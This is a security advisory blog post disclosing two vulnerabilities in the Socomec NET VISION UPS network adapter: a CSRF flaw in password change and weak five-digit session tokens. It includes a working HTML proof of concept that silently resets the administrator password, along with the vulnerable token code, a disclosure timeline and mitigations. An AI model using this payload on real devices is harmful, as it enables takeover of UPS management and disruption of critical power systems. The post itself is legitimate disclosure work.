---
layout: post
title: "CVE-2024-4600 and CVE-2024-4601. Security Vulnerabilities Found in Socomec NET VISION UPS Network Adapter"
date: 2025-02-19
categories: [security, research]
tags: [cve, vulnerabilities, network-security, socomec, ups-security, netvision]
---

Net Vision is a communication interface designed for enterprise networks that enables a direct and secure connection between the UPS and the Ethernet network. This connection provides a wide range of network services, including UPS monitoring, event notifications, automatic shutdown of UPS-powered servers, and many other services. Net Vision also functions as an IoT gateway, granting access to a variety of digital services. It is compatible with all UPS models equipped with a communication slot.

![](img/socomec.png)

Power management in critical infrastructure requires reliable monitoring and control capabilities. Socomec, a company specializing in low-voltage electrical equipment, offers NET VISION - a professional network adapter designed for remote UPS monitoring and control. This adapter enables direct UPS connection to IPv4/IPv6 networks, allowing remote management through web browsers, TELNET interfaces, or SNMP-based Network Management Systems (NMS).

During a security assessment at IOActive, I evaluated version 7.20 of the NET VISION adapter and discovered several security issues that could potentially impact organizations using these devices for UPS management. These findings highlight the ongoing challenges in securing industrial monitoring equipment.

## CSRF Vulnerability in Password Change Functionality (CVE-2024-4600)

### Description
The first vulnerability, rated as MEDIUM severity, involves a Cross-Site Request Forgery (CSRF) weakness in the password change mechanism. The web interface lacks proper CSRF protections, allowing an attacker to trick authenticated administrators into unknowingly changing their passwords.

What makes this vulnerability particularly concerning is that the password change functionality doesn't require the current password for verification, making the attack easier to execute.


### Proof of Concept
The vulnerability can be exploited using this simple HTML form:


```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://[DEVICE-IP]/cgi/set_param.cgi"
method="POST" enctype="text/plain">
<input type="hidden"
name="xml&amp;user&#46;su&#46;passCheck&#91;0&#93;"
value="IOActive1234&amp;user&#46;su&#46;passCheck&#91;1&#93;&#61;
IOActive1234" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

When an authenticated administrator visits a page containing this code, their password would be changed to "IOActive1234" without their knowledge or consent.


### Impact
An attacker could:
- Change administrator passwords without knowing the current password
- Lock legitimate administrators out of their systems
- Gain unauthorized access to UPS management functions
- Potentially disrupt power management operations


## Weak Session Management (CVE-2024-4601)

### Description
The second vulnerability, rated as LOW severity, relates to weak session management implementation. The application uses a five-digit integer for session handling, which is cryptographically insufficient for secure session management.

The session token is generated using this JavaScript code in `/super_user.js`:

```javascript
function runScript(e) {
    if (e.keyCode == 13) {
        var hashkey2 = Base64.encode($("#login-box #password").val());
        var tmpToken = getRandomInt(1,1000000);
        Set_Cookie("user_name",$("#login-box #username").val());
        Set_Cookie("tmpToken", tmpToken);
        document.getElementById("token").value = tmpToken;
```

### Impact
This implementation is vulnerable because:
- The session token space is too small (maximum of 1,000,000 possible values)
- Tokens are predictable due to the simple random number generation
- An attacker could potentially brute force valid session tokens
- The implementation lacks many security best practices for session management


## Timeline and Resolution
- September 29, 2022: Vulnerabilities discovered
- June 28, 2023: Vulnerabilities reported to Socomec
- November 21, 2023: Socomec confirmed fixes in new NET VISION card (version 8)
- January 9, 2024: Vulnerabilities reported to INCIBE (Spanish CERT)
- March 5, 2024: Advisory published


## Recommendations
For organizations using NET VISION adapters:

1. Upgrade to NET VISION version 8 or later as soon as possible
2. Implement network segmentation to isolate UPS management interfaces
3. Use VPNs or similar secure access methods for remote management
4. Regularly monitor for unauthorized access attempts
5. Implement proper access controls at the network level

For manufacturers implementing web interfaces:

1. Implement proper CSRF protection using tokens
2. Require current password verification for password changes
3. Use cryptographically secure session management
4. Follow OWASP session management best practices
5. Implement proper security controls from the design phase


## Conclusion
These vulnerabilities in the NET VISION adapter demonstrate common web security issues that continue to appear in industrial equipment. While the individual vulnerabilities might not seem critical in isolation, their combination could allow attackers to compromise UPS management systems, potentially affecting critical infrastructure availability.

Find all the details of this advisory on [IOActive's Blog](https://info.ioactive.com/acton/attachment/34793/f-c12d52b0-c78e-47d5-86aa-7fc84eadb95f/1/-/-/-/-/IOActive%20Security%20Advisory%20-%20Socomec%20NET%20VISION%20Multiple%20Vulnerabilities.pdf)
